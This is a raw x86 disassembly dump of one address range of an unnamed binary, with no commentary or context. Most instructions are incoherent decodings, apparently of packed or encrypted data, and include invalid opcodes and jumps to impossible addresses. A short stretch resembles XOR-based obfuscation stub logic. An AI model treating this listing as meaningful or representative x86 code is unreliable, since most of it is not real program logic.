  4059ee:	and    dh,bh
  4059f0:	loope  0x4059fc
  4059f2:	cmp    esp,DWORD PTR [edx+edi*1-0x27a5801b]
  4059f9:	in     eax,0x59
  4059fb:	jmp    0x82e5:0x527f7216
  405a02:	sub    bh,bl
  405a04:	cdq    
  405a05:	aad    0xcc
  405a07:	xor    ah,dh
  405a09:	out    dx,al
  405a0a:	fwait
  405a0b:	dec    esi
  405a0c:	aas    
  405a0d:	mov    al,0x45
  405a0f:	scas   al,BYTE PTR es:[edi]
  405a10:	ficomp WORD PTR [ecx+esi*4]
  405a13:	test   BYTE PTR [ebx],al
  405a15:	inc    esp
  405a16:	mov    cl,BYTE PTR [esp]
  405a19:	jbe    0x405a43
  405a1b:	pop    ds
  405a1c:	inc    esi
  405a1d:	add    esp,DWORD PTR [esi]
  405a1f:	sar    BYTE PTR [esi-0x1113bf53],0x7d
  405a26:	dec    edx
  405a27:	inc    esp
  405a28:	mov    ds:0x3f13fff9,al
  405a2d:	test   al,0x64
  405a2f:	add    al,0xf
  405a31:	fnstcw WORD PTR [ebx]
  405a33:	leave  
  405a34:	mov    eax,ds:0xae09d48b
  405a39:	mov    ds:0x3484ae72,eax
  405a3e:	add    al,0xe5
  405a40:	xchg   esp,eax
  405a41:	sbb    al,0xb
  405a43:	and    al,0xbf
  405a45:	push   ebp
  405a46:	inc    edi
  405a47:	dec    edx
  405a48:	mov    ch,0xf4
  405a4a:	push   ebp
  405a4b:	pop    edi
  405a4c:	sbb    al,0xec
  405a4e:	and    ch,BYTE PTR [edi+0x63]
  405a51:	pop    esi
  405a52:	aad    0x4b
  405a54:	out    0x37,eax
  405a56:	inc    esi
  405a57:	cmp    al,0xe3
  405a59:	mov    dl,0xa1
  405a5b:	cli    
  405a5c:	xchg   esp,eax
  405a5d:	and    al,BYTE PTR [ebx-0x3d]
  405a60:	ret    
  405a61:	fistp  DWORD PTR [ebx-0x59]
  405a64:	pop    ecx
  405a65:	jp     0x405a69
  405a67:	out    0x2f,eax
  405a69:	jae    0x405a7f
  405a6b:	mov    ecx,0x5eee472a
  405a70:	icebp  
  405a71:	outs   dx,DWORD PTR ds:[esi]
  405a72:	jle    0x405aca
  405a74:	(bad)  
  405a75:	pop    ds
  405a76:	fdiv   st(1),st
  405a78:	arpl   WORD PTR [esi+0x5dfa3c88],dx
  405a7e:	cli    
  405a7f:	or     al,0x70
  405a81:	dec    ebx
  405a82:	pop    ecx
  405a83:	mov    ds:0x305bcee2,al
  405a88:	loopne 0x405ac5
  405a8a:	shl    bh,1
  405a8c:	or     eax,0x69a17aed
  405a91:	adc    BYTE PTR [ecx-0x2d],0x2b
  405a95:	stos   BYTE PTR es:[edi],al
  405a96:	jl     0x405aad
  405a98:	loop   0x405a23
  405a9a:	leave  
  405a9b:	sub    al,0x2a
  405a9d:	in     al,dx
  405a9e:	xor    ecx,0x0
  405aa1:	jb     0x405a41
  405aa3:	(bad)  
  405aa5:	or     DWORD PTR [edx-0x4f9d6554],0xd
  405aac:	pop    edx
  405aad:	push   edi
  405aae:	push   eax
  405aaf:	(bad)  
  405ab1:	or     DWORD PTR [ebx+0x6c425585],eax
  405ab7:	shl    BYTE PTR [ebp-0x8db17e1],0x3a
  405abe:	loope  0x405aa1
  405ac0:	and    eax,0x7ea82292
  405ac5:	loop   0x405a8a
  405ac7:	pushf  
  405ac8:	outs   dx,DWORD PTR ds:[esi]
  405ac9:	dec    eax
  405aca:	fcom   QWORD PTR [edi-0x4de363c6]
  405ad0:	scas   eax,DWORD PTR es:[edi]
  405ad1:	outs   dx,DWORD PTR ds:[esi]
  405ad2:	xchg   esi,eax
  405ad3:	fdivr  DWORD PTR [edx-0x19]
  405ad6:	(bad)  
  405ad7:	push   es
  405ad8:	xor    eax,0x439e5b21
  405add:	push   0x74
  405adf:	inc    eax
  405ae0:	lea    esp,[edi-0x24d2ef95]
  405ae6:	mov    ch,0x2e
  405ae8:	mov    eax,0x7db37c50
  405aed:	jns    0x405ae9
  405aef:	push   ecx
  405af0:	pop    esi
  405af1:	mov    esi,DWORD PTR [esi+0x7a]
  405af4:	fisubr DWORD PTR [edx+0x62755d7b]
  405afa:	jnp    0x405ae7
  405afc:	lock test al,0xe0
  405aff:	aaa    
  405b00:	out    dx,eax
  405b01:	jbe    0x405b71
  405b03:	repz ret 0x40c8
  405b07:	aam    0x48
  405b09:	aad    0x2f
  405b0b:	jne    0x405b72
  405b0d:	jns    0x405ad6
  405b0f:	and    ecx,DWORD PTR [edi]
  405b11:	pop    edi
  405b12:	sbb    DWORD PTR [eax+esi*4+0x57],edi
  405b16:	xor    dl,ch
  405b18:	cmp    cl,BYTE PTR [eax-0x4]
  405b1b:	aam    0x9f
  405b1d:	int    0x3c
  405b1f:	push   cs
  405b20:	data16 xchg BYTE PTR es:[edi-0x24d613af],bl
  405b28:	pop    ds
  405b29:	ret    
  405b2a:	mov    ds:0x72e954b7,eax
  405b2f:	sub    BYTE PTR [edi],cl
  405b31:	lods   eax,DWORD PTR ds:[esi]
  405b32:	mov    DWORD PTR [ebp+0x10],ecx
  405b35:	mov    ecx,0xc6d
  405b3a:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  405b41:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  405b48:	mov    ecx,0xf89c8532
  405b4d:	push   esi
  405b4e:	mov    esi,DWORD PTR ds:0x43379b
  405b54:	mov    DWORD PTR [ebp+0x10],0x70019f3
  405b5b:	mov    esi,DWORD PTR [ebp-0x4]
  405b5e:	cmp    ecx,esi
  405b60:	je     0x405b9b
  405b66:	mov    esi,DWORD PTR [ebp+0xc]
  405b69:	xor    ecx,eax
  405b6b:	xor    DWORD PTR ds:0x433753,0x55d1
  405b75:	xor    esi,eax
  405b77:	lea    ecx,[esi+ecx*1+0x32729b]
  405b7e:	xor    ecx,eax
  405b80:	cmp    ecx,0xf89c8521
  405b86:	jne    0x405b4e
  405b8c:	mov    DWORD PTR ds:0x4337a3,0x74e6
  405b96:	jmp    0x4062dd
  405b9b:	add    ecx,0xffcd8d65
  405ba1:	mov    esi,ecx
  405ba3:	xor    esi,eax
  405ba5:	add    esi,DWORD PTR [ebp+0x8]
  405ba8:	mov    DWORD PTR ds:0x4337ef,0x6ead
  405bb2:	mov    DWORD PTR [ebp+0x8],esi
  405bb5:	mov    esi,DWORD PTR [ebp+0x8]
  405bb8:	mov    DWORD PTR ds:0x43382f,0x3a4c
  405bc2:	jmp    0x405f11
  405bc7:	jmp    0x4f7a1a24
  405bcc:	fldcw  WORD PTR [ecx+0x68]
  405bcf:	les    esi,FWORD PTR [esi-0x41]
  405bd2:	adc    eax,0x6f557643
  405bd7:	call   0x2cbeda11
  405bdc:	jge    0x405c5c
  405bde:	jle    0x405be4
  405be0:	or     BYTE PTR [edi],ah
  405be2:	or     DWORD PTR [edi],eax
  405be4:	mov    dl,0xc4
  405be6:	mov    al,0x11
  405be8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405be9:	adc    BYTE PTR [eax-0x16],cl
  405bec:	imul   ebp,DWORD PTR [ebp+eiz*4-0x5c],0x23
  405bf1:	dec    ecx
  405bf2:	adc    dh,BYTE PTR [eax-0xb]
  405bf5:	loopne 0x405c57
  405bf7:	out    dx,eax
  405bf8:	xchg   edx,eax
  405bf9:	pop    edx
  405bfa:	jmp    0x405c2b
  405bfc:	mov    esi,0x9624e988
  405c01:	add    ebx,ecx
  405c03:	and    cl,BYTE PTR [ebp-0x6]
  405c06:	in     al,0xa5
  405c08:	xchg   DWORD PTR [ecx+0x3f],esi
  405c0b:	sahf   
  405c0c:	mov    edi,DWORD PTR [esi]
  405c0e:	cli    
  405c0f:	mov    al,BYTE PTR [eax]
  405c11:	lock dec ebx
  405c13:	imul   ebp,DWORD PTR [esi-0x3c569df9],0xffffff86
  405c1a:	clc    
  405c1b:	add    esi,DWORD PTR [ebx+0x41]
  405c1e:	in     eax,dx
  405c1f:	or     cl,BYTE PTR [esi-0x3ec25b76]
  405c25:	daa    
  405c26:	or     DWORD PTR [edx-0x2389d2f4],edi
  405c2c:	sbb    eax,0x9d13bc7f
  405c31:	dec    ebp
  405c32:	out    dx,al
  405c33:	pop    esp
  405c34:	jecxz  0x405c64
  405c36:	cld    
  405c37:	test   al,0x5e
  405c39:	mov    eax,ds:0x4535c8b2
  405c3e:	rcr    BYTE PTR [ecx+0x3d8e1dd1],0xb6
  405c45:	push   cs
  405c46:	xor    al,bh
  405c48:	bound  edi,QWORD PTR [esi]
  405c4a:	vpmadcsswd ymm0,ymm1,YMMWORD PTR [eax+ebp*1+0x69baacef],ymm0
  405c55:	lds    esp,FWORD PTR [ebp-0x9]
  405c58:	cdq    
  405c59:	lea    ebx,[ebp-0x57]
  405c5c:	xchg   BYTE PTR [esi],dh
  405c5e:	adc    al,0x15
  405c60:	nop
  405c61:	cmp    BYTE PTR [ebx-0x1c],0xfd
  405c65:	test   al,0xbd
  405c67:	and    bh,dl
  405c69:	push   esp
  405c6a:	arpl   WORD PTR [ebp-0x78a37462],sp
  405c70:	outs   dx,BYTE PTR ds:[esi]
  405c71:	fisubr WORD PTR [esi+eax*1-0x59ca53b4]
  405c78:	and    ebp,DWORD PTR [ecx+0x4f]
  405c7b:	dec    esp
  405c7c:	mov    bl,0x18
  405c7e:	mov    bh,0x70
  405c80:	fistp  WORD PTR [ebx-0x1f8fee0d]
  405c86:	shl    BYTE PTR [edx],1
  405c88:	mov    bh,bh
  405c8a:	mov    DWORD PTR [ebp+0x2a],ebp
  405c8d:	ret    
  405c8e:	sbb    al,bh
  405c90:	sahf   
  405c91:	mov    ebp,0x51ac97a5
  405c96:	pop    ebp
  405c97:	fucomi st,st(2)
  405c99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c9a:	jg     0x405c88
  405c9c:	in     al,dx
  405c9d:	sub    edi,DWORD PTR [eax+0x2e]
  405ca0:	outs   dx,DWORD PTR ds:[esi]
  405ca1:	xor    ch,ah
  405ca3:	push   es
  405ca4:	jbe    0x405c8f
  405ca6:	adc    BYTE PTR [ebx+0x2085afc4],cl
  405cac:	rcr    BYTE PTR [edi+0x17],cl
  405caf:	fild   WORD PTR [ecx+edx*2]
  405cb2:	jnp    0x405caa
  405cb4:	xchg   DWORD PTR [eax-0x1fdccae],edx
  405cba:	data16 (bad) 
  405cbc:	aad    0x65
  405cbe:	adc    eax,edi
  405cc0:	pop    esi
  405cc1:	mov    edx,DWORD PTR [edi]
  405cc3:	lahf   
  405cc4:	adc    al,0x9
  405cc6:	data16 js 0x405c7c
  405cc9:	xchg   edx,eax
  405cca:	jl     0x405ca1
  405ccc:	pop    edx
  405ccd:	cdq    
  405cce:	outs   dx,BYTE PTR ds:[esi]
  405ccf:	xor    eax,ecx
  405cd1:	div    BYTE PTR [ebp-0x4c0b9054]
  405cd7:	ins    DWORD PTR es:[edi],dx
  405cd8:	lea    ebx,[eax+ebx*1]
  405cdb:	dec    eax
  405cdc:	jl     0x405c70
  405cde:	call   0xa287f1aa
  405ce3:	outs   dx,BYTE PTR ds:[esi]
  405ce4:	push   0x3bded3eb
  405ce9:	xor    dh,ch
  405ceb:	push   es
  405cec:	xchg   edi,eax
  405ced:	fld    QWORD PTR [edx]
  405cef:	mov    WORD PTR [edx+0x3b894809],?
  405cf5:	mov    ch,0xa8
  405cf7:	jbe    0x405ce4
  405cf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cfa:	mov    bh,0x4f
  405cfc:	sti    
  405cfd:	push   ss
  405cfe:	mov    cl,0xb2
  405d00:	mov    ds:0x5d0e389f,eax
  405d05:	cmp    eax,0xf92d9a32
  405d0a:	jns    0x405cbc
  405d0c:	sbb    BYTE PTR [edi],al
  405d0e:	pop    edi
  405d0f:	lahf   
  405d10:	in     eax,dx
  405d11:	enter  0x3737,0xc4
  405d15:	imul   eax,edi,0x1d
  405d18:	or     ch,ah
  405d1a:	dec    ecx
  405d1b:	push   0xffffffde
  405d1d:	xchg   edi,eax
  405d1e:	shl    DWORD PTR [edi-0x36],0x5c
  405d22:	in     al,0x58
  405d24:	jmp    0xaf9f4435
  405d29:	adc    DWORD PTR [edx+0x16dd1374],ebx
  405d2f:	cmp    esi,esi
  405d31:	xchg   DWORD PTR [edi+0x169231ef],edi
  405d37:	and    al,0x47
  405d39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d3a:	cmp    eax,0x4a2096d4
  405d3f:	mov    ch,0x9e
  405d41:	fsub   st,st(1)
  405d43:	(bad)  
  405d45:	retf   
  405d46:	pop    ecx
  405d47:	enter  0xd2f7,0x56
  405d4b:	pop    ds
  405d4c:	mov    ds:0x8b8add5,eax
  405d51:	jmp    0x405d67
  405d53:	mov    al,0x69
  405d55:	jmp    0x491c:0x5d57d0d2
  405d5c:	push   edx
  405d5d:	dec    esi
  405d5e:	mov    dh,0xff
  405d60:	shl    DWORD PTR [edx-0x18],1
  405d63:	loope  0x405d76
  405d65:	mov    eax,ds:0xc99aee55
  405d6a:	sti    
  405d6b:	jg     0x405de1
  405d6d:	(bad)  
  405d6f:	daa    
  405d70:	jl     0x405d6f
  405d72:	repnz lods al,BYTE PTR ds:[esi]
  405d74:	adc    eax,0xddcd602c
  405d79:	dec    esi
  405d7a:	shr    DWORD PTR ds:0xb91d6646,cl
  405d80:	pop    esi
  405d81:	mov    ah,0x7
  405d83:	fnstcw WORD PTR [esi-0x4cfdcf14]
  405d89:	add    esp,esp
  405d8b:	imul   eax,DWORD PTR [esi+0x2474dedc],0x37
  405d92:	cmp    BYTE PTR [edi],al
  405d94:	xchg   edx,eax
  405d95:	rcr    BYTE PTR [edi],0xd8
  405d98:	scas   al,BYTE PTR es:[edi]
  405d99:	lds    esi,FWORD PTR [ecx-0x43]
  405d9c:	jbe    0x405daf
  405d9e:	rol    BYTE PTR [edx-0x6e],0x65
  405da2:	mov    ds:0x7cbccdcc,al
  405da7:	fldenv [esi-0x54dcabff]
  405dad:	adc    cl,BYTE PTR [ecx]
  405daf:	inc    ebx
  405db0:	setno  BYTE PTR [ebx]
  405db3:	retf   
  405db4:	pop    esp
  405db5:	enter  0x3ec9,0x2
  405db9:	xor    edi,DWORD PTR [ebp-0x1f]
  405dbc:	sti    
  405dbd:	loope  0x405dab
  405dbf:	mov    es,WORD PTR [edx+0x4d]
  405dc2:	and    BYTE PTR [edi],ah
  405dc4:	test   BYTE PTR [ecx-0x6a],0x62
  405dc8:	fnstcw WORD PTR [edx]
  405dca:	push   eax
  405dcb:	popa   
  405dcc:	push   esp
  405dcd:	xchg   esi,eax
  405dce:	lock (bad) 
  405dd0:	mov    ah,0xf7
  405dd2:	cmp    dl,ch
  405dd4:	xchg   al,ah
  405dd6:	lds    ecx,FWORD PTR [eax-0x5b]
  405dd9:	test   eax,0xd0b11c7a
  405dde:	inc    ecx
  405ddf:	or     cl,ah
  405de1:	gs mov cl,0xa1
  405de4:	retf   0x636d
  405de7:	das    
  405de8:	sahf   
  405de9:	fistp  DWORD PTR [esi+0x63b55ed6]
  405def:	icebp  
  405df0:	imul   esi,DWORD PTR [edi+eax*8-0x48],0x9dcde7c3
  405df8:	sub    DWORD PTR [edx],ebx
  405dfa:	dec    ecx
  405dfb:	lds    eax,FWORD PTR [ebx-0x9]
  405dfe:	adc    al,0xf2
  405e00:	mov    ecx,0xe07bf071
  405e05:	test   BYTE PTR [edi+0x66e9b5c1],0x88
  405e0c:	out    0xdc,al
  405e0e:	test   DWORD PTR [edx],0xf30f093e
  405e14:	(bad)  
  405e15:	rol    BYTE PTR [edx],1
  405e17:	mov    edx,DWORD PTR [ecx]
  405e19:	dec    ecx
  405e1a:	cmp    esp,DWORD PTR [ebp+edx*8+0x461c2cac]
  405e21:	pop    es
  405e22:	sbb    edx,DWORD PTR [eax]
  405e24:	imul   ebp,DWORD PTR [ebp+0x1c57c8ac],0x5dafb4db
  405e2e:	cmp    ebp,esi
  405e30:	mov    bl,0x6
  405e32:	add    ecx,DWORD PTR [ecx]
  405e34:	daa    
  405e35:	daa    
  405e36:	xchg   esi,eax
  405e37:	ss pusha 
  405e39:	pop    ss
  405e3a:	ret    
  405e3b:	push   edx
  405e3c:	out    0xb5,al
  405e3e:	and    BYTE PTR [esi-0x2e],al
  405e41:	pop    ebp
  405e42:	inc    edi
  405e43:	push   0x7
  405e45:	mov    eax,ds:0x588c84ff
  405e4a:	(bad)  
  405e4b:	cs std 
  405e4d:	push   0x2
  405e4f:	aas    
  405e50:	imul   edi,DWORD PTR [eax-0x2d],0x486ed761
  405e57:	pop    eax
  405e58:	inc    edi
  405e59:	or     esi,DWORD PTR [bx-0x182a]
  405e5e:	or     BYTE PTR [eax-0x6c83571],ah
  405e64:	ret    
  405e65:	pop    ebx
  405e66:	div    BYTE PTR [ebx]
  405e68:	jmp    0x405e3d
  405e6a:	test   BYTE PTR [ecx-0x20],al
  405e6d:	aaa    
  405e6e:	outs   dx,BYTE PTR ds:[esi]
  405e6f:	mov    gs,WORD PTR [ecx-0x5ba1017b]
  405e75:	sub    DWORD PTR [esi-0xc13ab6d],edx
  405e7b:	jbe    0x405e2f
  405e7d:	xchg   DWORD PTR [ebx+0x29],eax
  405e80:	push   0x4d
  405e82:	mov    eax,ebp
  405e84:	in     al,0xeb
  405e86:	repnz mov esp,0x48e59937
  405e8c:	dec    ebx
  405e8d:	(bad)  
  405e8e:	jl     0x405eb3
  405e90:	and    BYTE PTR [esi-0x29],ch
  405e93:	pop    ebp
  405e94:	pop    edi
  405e95:	bndldx bnd1,[eax+0x5d]
  405e99:	sub    edi,ebp
  405e9b:	inc    edx
  405e9c:	cmp    DWORD PTR [edx],edi
  405e9e:	pushf  
  405e9f:	push   ds
  405ea0:	ins    DWORD PTR es:[edi],dx
  405ea1:	pop    es
  405ea2:	std    
  405ea3:	into   
  405ea4:	stc    
  405ea5:	xchg   edi,eax
  405ea6:	jnp    0x405e7a
  405ea8:	leave  
  405ea9:	ins    DWORD PTR es:[edi],dx
  405eaa:	xchg   edx,eax
  405eab:	aaa    
  405eac:	lds    ecx,FWORD PTR [ecx+0x5e547780]
  405eb2:	aad    0xa5
  405eb4:	mov    dl,0x35
  405eb6:	jmp    0x91c5c7bc
  405ebb:	push   esp
  405ebc:	xchg   esi,eax
  405ebd:	push   ebx
  405ebe:	fldl2t 
  405ec0:	cmp    ecx,eax
  405ec2:	cmp    DWORD PTR [edi-0x55],edx
  405ec5:	popf   
  405ec6:	pop    ds
  405ec7:	xchg   esp,eax
  405ec8:	std    
  405ec9:	jnp    0x405ef5
  405ecb:	or     DWORD PTR [ebx-0xa],esi
  405ece:	ds out 0x26,eax
  405ed1:	(bad)
  405ed4:	xor    BYTE PTR ds:0x468ceb6f,0x81
  405edb:	jne    0x405ec4
  405edd:	cmp    ebp,DWORD PTR [esi+0x51]
  405ee0:	cmp    DWORD PTR [ecx],eax
  405ee2:	and    BYTE PTR [ebx],cl
  405ee4:	cmp    dh,cl
  405ee6:	sub    dl,dl
  405ee8:	std    
  405ee9:	cmp    DWORD PTR ds:0xca7200c8,ebp
  405eef:	(bad)  
  405ef0:	rol    dl,cl
  405ef2:	and    al,0xb3
  405ef4:	jmp    0x509d3231
  405ef9:	adc    ebp,ecx
  405efb:	lea    ebp,[eax+0x6334a876]
  405f01:	fnstcw WORD PTR [ebx+eiz*8+0x40]
  405f05:	aam    0x9e
  405f07:	jnp    0x405f3b
  405f09:	xchg   esp,eax
  405f0a:	add    al,BYTE PTR [edi+0x5f3db677]
  405f10:	ins    BYTE PTR es:[edi],dx
  405f11:	xor    esi,ecx
  405f13:	neg    ecx
  405f15:	jmp    0x406264
  405f1a:	jne    0x405eee
  405f1c:	sub    al,0xaa
  405f1e:	test   eax,0x31d17170
  405f23:	test   eax,edx
  405f25:	mov    ebp,es
  405f27:	jmp    0x405f5c
  405f29:	in     al,0xa6
  405f2b:	xor    BYTE PTR [esi+0x7e],bh
  405f2e:	sub    al,0x7d
  405f30:	jle    0x405fb0
  405f32:	sub    eax,0x81b6ed09
  405f37:	adc    eax,0xbcd1a6f3
  405f3c:	in     eax,dx
  405f3d:	loop   0x405f88
  405f3f:	mov    ch,BYTE PTR ss:[edi]
  405f42:	sbb    BYTE PTR ds:0x132ab313,bl
  405f48:	adc    bh,ah
  405f4a:	lods   al,BYTE PTR ds:[esi]
  405f4b:	repz xor DWORD PTR [eax+0x4908a11e],edx
  405f52:	pop    eax
  405f53:	mov    ecx,0xc96b0f7a
  405f58:	ins    BYTE PTR es:[edi],dx
  405f59:	jb     0x405f36
  405f5b:	sub    eax,0xe30b2131
  405f60:	push   ebp
  405f61:	pop    ecx
  405f62:	sbb    esi,ebp
  405f64:	arpl   WORD PTR [esi-0x32],di
  405f67:	add    DWORD PTR [ecx+0x59b581f9],edi
  405f6d:	hlt    
  405f6e:	mov    edx,0x8bd460ff
  405f73:	sub    eax,ebx
  405f75:	sbb    eax,0x78d1f3ec
  405f7a:	or     bl,BYTE PTR [edi]
  405f7c:	sub    BYTE PTR [esi-0x1d01f5ae],ah
  405f82:	mov    eax,0x90d5411d
  405f87:	lahf   
  405f88:	ds inc ecx
  405f8a:	pop    ecx
  405f8b:	loopne 0x405fa6
  405f8d:	xchg   DWORD PTR [edi-0x5c],ebx
  405f90:	je     0x405f9b
  405f92:	mov    esp,0xbbf076d4
  405f97:	in     eax,0x23
  405f99:	jb     0x405fb6
  405f9b:	(bad)  
  405f9c:	hlt    
  405f9d:	and    DWORD PTR ds:0x72981f39,0x44ce925e
  405fa7:	outs   dx,DWORD PTR ds:[esi]
  405fa8:	test   BYTE PTR [ecx+0x43],bl
  405fab:	mov    eax,ds:0x7ba8754e
  405fb0:	outs   dx,BYTE PTR ds:[esi]
  405fb1:	xchg   esi,eax
  405fb2:	or     BYTE PTR [ecx],bh
  405fb4:	ror    BYTE PTR [ecx],cl
  405fb6:	adc    ebx,edx
  405fb8:	inc    esp
  405fb9:	xor    eax,0x1a9d0858
  405fbe:	or     esp,0x9357cee1
  405fc4:	push   esp
  405fc5:	daa    
  405fc6:	xlat   BYTE PTR ds:[ebx]
  405fc7:	mov    eax,ds:0x541848ec
  405fcc:	fisubr WORD PTR [ebp+0x12]
  405fcf:	pop    ds
  405fd0:	and    eax,0x5ca6c09d
  405fd5:	sti    
  405fd6:	xchg   ecx,eax
  405fd7:	cmp    al,0xac
  405fd9:	add    esi,esi
  405fdb:	int    0x2c
  405fdd:	stos   DWORD PTR es:[edi],eax
  405fde:	int    0x55
  405fe0:	scas   al,BYTE PTR es:[edi]
  405fe1:	or     BYTE PTR [eax-0x4e99dc5e],cl
  405fe7:	adc    dh,BYTE PTR [esi+esi*4]
  405fea:	xor    al,0xec
  405fec:	stc    
  405fed:	loop   0x405f78
  405fef:	imul   esi,ebp,0x5052f970
  405ff5:	(bad)  
  405ff6:	mov    ah,0x96
  405ff8:	and    eax,0x9483bb76
  405ffd:	push   ss
  405ffe:	jge    0x406014
  406000:	pop    ss
  406001:	and    cl,0x12
  406004:	mov    esi,0x658e890e
  406009:	cmp    BYTE PTR [esi],0x15
  40600c:	sub    BYTE PTR [ebx-0x61],bl
  40600f:	in     eax,dx
  406010:	cmp    eax,DWORD PTR ds:0x4d0d95da
  406016:	ret    0xf8c4
  406019:	jno    0x406062
  40601b:	mov    ch,ah
  40601d:	mov    dh,0xb8
  40601f:	mov    gs,WORD PTR [edi+0x23004d38]
  406025:	fild   DWORD PTR [ebx+eax*2]
  406028:	scas   eax,DWORD PTR es:[edi]
  406029:	aaa    
  40602a:	mov    ebp,0xa083aebf
  40602f:	adc    DWORD PTR [esi-0xc],0x5
  406033:	retf   
  406034:	jbe    0x406035
  406036:	mov    dl,dl
  406038:	int    0x9c
  40603a:	sbb    BYTE PTR [esi-0x3f],ch
  40603d:	rcl    DWORD PTR [edx-0x54],cl
  406040:	pop    edx
  406041:	rol    edx,1
  406043:	into   
  406044:	sub    bl,BYTE PTR [ecx+edi*8-0x3f598436]
  40604b:	and    bl,ah
  40604d:	or     DWORD PTR ds:0xff15fb2,esp
  406053:	mov    esp,edx
  406055:	aas    
  406056:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406057:	sti    
  406058:	idiv   BYTE PTR [eax]
  40605a:	jge    0x405ff8
  40605c:	cmp    BYTE PTR [eax],bh
  40605e:	xchg   ecx,eax
  40605f:	jl     0x40601b
  406061:	inc    eax
  406062:	leave  
  406063:	cmp    ebx,DWORD PTR [ebp-0x32]
  406066:	jmp    0xa2297b89
  40606b:	push   es
  40606c:	ret    0x4104
  40606f:	xchg   esi,eax
  406070:	mov    ah,dh
  406072:	out    0x58,eax
  406074:	xor    al,0xca
  406076:	cli    
  406077:	jp     0x406060
  406079:	pop    es
  40607a:	shl    DWORD PTR [eax],1
  40607c:	mov    esi,0xa5bda08f
  406081:	es cmc 
  406083:	sbb    DWORD PTR [edx*4-0x6147d401],esp
  40608a:	rcl    ecx,1
  40608c:	out    0x91,eax
  40608e:	test   cl,al
  406090:	dec    esi
  406091:	pop    eax
  406092:	das    
  406093:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406094:	cmp    ah,BYTE PTR [eax-0x5a]
  406097:	enter  0x2757,0x39
  40609b:	loopne 0x4060f4
  40609d:	jbe    0x4060bb
  40609f:	scas   al,BYTE PTR es:[edi]
  4060a0:	loope  0x40609f
  4060a2:	test   al,0x71
  4060a4:	ins    BYTE PTR es:[edi],dx
  4060a5:	fiadd  WORD PTR [ebp+0x73]
  4060a8:	test   DWORD PTR [edx],esi
  4060aa:	cmp    edx,DWORD PTR [eax+0x3f]
  4060ad:	push   eax
  4060ae:	enter  0x5ab1,0x5
  4060b2:	mov    eax,ds:0xb543e29b
  4060b7:	mov    es,esi
  4060b9:	rcl    BYTE PTR [ecx+0x2c],cl
  4060bc:	clc    
  4060bd:	fucomip st,st(3)
  4060bf:	adc    cl,cl
  4060c1:	test   al,0x52
  4060c3:	add    dh,BYTE PTR [ebx-0x248d33ae]
  4060c9:	dec    ecx
  4060ca:	pop    ebx
  4060cb:	push   ecx
  4060cc:	repz repz addr16 aas 
  4060d0:	fadd   DWORD PTR [ebp-0x720a8f9]
  4060d6:	fild   WORD PTR ds:0xf94cb550
  4060dc:	inc    esp
  4060dd:	cli    
  4060de:	fdivr  DWORD PTR ds:0x62ffe4a1
  4060e4:	add    ebx,DWORD PTR [ecx-0x53ba0d0f]
  4060ea:	add    edx,DWORD PTR [eax+0x1c94971a]
  4060f0:	sbb    DWORD PTR [eax+0x8],0x7dc0347e
  4060f7:	sbb    BYTE PTR [ebx],0xc7
  4060fa:	out    dx,al
  4060fb:	int3   
  4060fc:	fcmovb st,st(2)
  4060fe:	lock mov bl,0x73
  406101:	xchg   ebx,eax
  406102:	stos   DWORD PTR es:[edi],eax
  406103:	int    0xef
  406105:	punpckhwd mm2,mm0
  406108:	xor    BYTE PTR [edx+0xc6039e6],ah
  40610e:	xchg   ecx,eax
  40610f:	icebp  
  406110:	jmp    0xbce3:0xa3ade63f
  406117:	sub    esi,DWORD PTR [eax+0x2c0b1bae]
  40611d:	pop    ebp
  40611e:	push   esi
  40611f:	push   esp
  406120:	ds sbb al,0x3d
  406123:	aaa    
  406124:	mov    ah,0xe4
  406126:	lahf   
  406127:	dec    ebx
  406128:	or     edx,DWORD PTR [eax+0x39]
  40612b:	test   al,0x92
  40612d:	xchg   ebp,eax
  40612e:	(bad)  
  40612f:	(bad)  
  406130:	cli    
  406131:	jmp    0x4c19:0x61e1d498
  406138:	adc    DWORD PTR [edx],ecx
  40613a:	mov    ds:0x1a7ec8e9,al
  40613f:	sbb    al,al
  406141:	rol    BYTE PTR [ebx-0x22],0xb2
  406145:	xor    dh,BYTE PTR [eax]
  406147:	dec    ebx
  406148:	je     0x406121
  40614a:	mov    esi,0xdfacc774
  40614f:	fnstsw WORD PTR [edx-0x4d]
  406152:	lock jno 0x406137
  406155:	mov    bl,0x91
  406157:	rcl    dl,cl
  406159:	test   eax,0x95df2cef
  40615e:	jge    0x406167
  406160:	pop    edi
  406161:	inc    edi
  406162:	pop    ds
  406163:	or     eax,0xb5a91035
  406168:	xchg   ebp,eax
  406169:	or     eax,0x80ccc1c4
  40616e:	test   BYTE PTR [edi+0x16],ch
  406171:	lock xchg esp,eax
  406173:	fmul   QWORD PTR [edi]
  406175:	in     al,dx
  406176:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406177:	lahf   
  406178:	push   cs
  406179:	push   ebx
  40617a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40617b:	jne    0x40615d
  40617d:	inc    esi
  40617e:	popa   
  40617f:	and    esi,DWORD PTR [ecx+0x2c]
  406182:	aas    
  406183:	add    DWORD PTR [eax],0xffffffd0
  406186:	das    
  406187:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406188:	ins    DWORD PTR es:[edi],dx
  406189:	rcr    DWORD PTR [edi-0x3d600c63],0x54
  406190:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406191:	shr    BYTE PTR [esi+esi*8-0x5f],cl
  406195:	push   ss
  406196:	xor    BYTE PTR [ebx+0xffd3236],al
  40619c:	pop    esi
  40619d:	stc    
  40619e:	gs inc edi
  4061a0:	mov    esp,0xa18e218d
  4061a5:	mov    al,0x88
  4061a7:	cmp    al,al
  4061a9:	mov    ds:0xc67f26db,eax
  4061ae:	(bad)  
  4061af:	lods   eax,DWORD PTR ds:[esi]
  4061b0:	pop    ecx
  4061b1:	or     BYTE PTR [ecx],bl
  4061b3:	aam    0x5d
  4061b5:	xadd   DWORD PTR ds:0x701d8446,esi
  4061bc:	dec    ecx
  4061bd:	stc    
  4061be:	sub    al,0xf7
  4061c0:	call   0x539b:0x3b66e027
